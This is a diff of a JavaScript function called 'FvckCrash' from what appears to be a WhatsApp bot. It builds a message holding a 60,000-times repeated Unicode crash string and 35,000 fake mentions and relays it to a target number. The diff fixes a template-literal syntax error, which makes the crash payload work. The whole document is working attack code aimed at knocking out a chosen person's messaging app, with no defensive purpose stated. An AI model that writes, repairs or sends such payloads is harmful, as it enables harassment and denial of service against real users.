@@ -389,9 +389,10 @@ for (let iter = 1; iter <= 100; iter++) {
 async function FvckCrash(target, ptcp = true) {   
     const trigger = "𑇂wxx1𑆵𑆴𑆿".repeat(60000);
     const mentionedList = [
-    target, ...Array.from({ length: 35000 }, () =>
-      1${Math.floor(Math.random() * 500000)}@s.whatsapp.net
-      )
+        target,
+        ...Array.from({ length: 35000 }, () =>
+            `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        )
     ];    
     try {
         const message = {
@@ -408,17 +409,17 @@ async function FvckCrash(target, ptcp = true) {
             },
             nativeFlowMessage: {},
             contextInfo: {
-              remoteJid: target,
-              participant: target,
-              mentionedJid: mentionedList,
-              disappearingMode: {
-                initiator: "CHANGED_IN_CHAT",
-                trigger: "CHAT_SETTING"
-              }
+                remoteJid: target,
+                participant: target,
+                mentionedJid: mentionedList,
+                disappearingMode: {
+                    initiator: "CHANGED_IN_CHAT",
+                    trigger: "CHAT_SETTING"
+                }
             },
         };
         await sock.relayMessage(target, message, {
-          userJid: target,
+            userJid: target,
         });
     } catch (error) {
         console.log("error:\n" + error);
